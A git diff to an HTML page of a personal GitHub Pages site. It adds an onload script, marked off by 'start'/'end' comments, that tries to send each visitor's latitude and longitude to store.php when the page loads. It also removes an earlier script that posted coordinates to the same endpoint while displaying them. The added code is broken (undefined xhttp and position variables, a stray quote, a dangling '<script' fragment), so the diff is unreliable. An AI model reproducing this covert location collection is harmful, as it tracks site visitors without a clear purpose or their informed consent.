@@ -5,6 +5,32 @@
 <link rel="icon" type="image/x-icon" href="https://github.com/ixtjaysonxpro/rizzmatics.github.io/blob/main/Shirt%20black.png?raw=true.ico">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<!--ssssssssssssssssssssssssttttttttttttttttttttttttttttttaaaaaaaaaaaaaaaaaaaaaaaaaaarrrrrrrrrrrttttttttttt-->
+<body onload="getLocation()">
+
+<p>Click the button to get your coordinates.</p>
+
+<button onclick="getLocation()">Try It</button>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+ xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude");
+ xhttp.send();
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+</script>
+
+</body>
+</html>
+ <!--EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEENNNNNNNNNNNNNNNNDDDDDD-->
 
 <style>
 .fa{padding:20px;font-size:30px;width:30px;text-align:center;text-decoration:none;margin:5px 2px;border-radius:50%}.fa:hover{opacity:.7}.fa-instagram{background:#ffffff;color:#fffff}
@@ -131,42 +157,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 </form>
 
 <a href="https://www.instagram.com/ixt_jaysonxpro/" class="fa fa-instagram"></a>
-<script>var x = document.getElementById("demo");
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendPositionToStore);
-  } else {
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
-
-function sendPositionToStore(position) {
-  var latitude = position.coords.latitude;
-  var longitude = position.coords.longitude;
-
-  // send the data to store.php using AJAX or fetch API
-  fetch("store.php", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ latitude: latitude, longitude: longitude })
-  })
-  .then(function(response) {
-    return response.text();
-  })
-  .then(function(data) {
-    console.log(data);
-  })
-  .catch(function(error) {
-    console.error(error);
-  });
-
-  // update the HTML to show the position to the user
-  x.innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
-}
-</script>  
+<script
 <center>
 <body itemscope itemtype="http://schema.org/Organization">
   <header>
